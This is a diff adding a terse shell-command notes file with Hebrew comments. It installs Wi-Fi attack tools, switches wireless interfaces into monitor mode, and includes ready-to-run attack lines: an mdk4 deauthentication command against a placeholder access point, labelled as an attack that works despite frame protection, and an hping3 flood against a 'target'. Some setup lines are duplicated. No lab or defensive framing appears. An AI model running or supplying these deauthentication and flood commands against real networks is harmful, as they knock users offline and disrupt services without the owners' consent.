@@ -1,0 +1,57 @@
+
+sudo apt-get install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre2-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils expect
+
+
+sudo apt update && sudo apt install -y aircrack-ng mdk3 mdk4 bettercap wavemon net-tools nmap arp-scan
+
+sudo apt install hcxdumptool hcxtools
+
+
+
+sudo airmon-ng check kill  wlan0
+
+sudo airmon-ng start wlan1
+
+
+#תקיפה עם תמיכה ב־MFP
+sudo mdk4 wlan1mon d -B AA:BB:CC:DD:EE:FF
+
+
+
+
+#עומס מקסימלי על הכרטיס
+sudo hping3 --flood target
+
+
+
+
+
+
+#כבה את הממשק
+sudo ip link set wlan0 down
+
+#הכנס למוניטור מוד
+sudo iw dev wlan0 set type monitor
+
+#הפעל מחדש
+sudo ip link set wlan0 up
+
+#פתח Wireshark ובחר את wlan0
+
+
+##
+
+
+
+sudo airmon-ng start wlan0
+#ייווצר ממשק חדש בשם wlan0mon
+
+
+
+
+
+
+sudo airmon-ng start wlan0
+#ייווצר ממשק חדש בשם wlan0mon
+
+
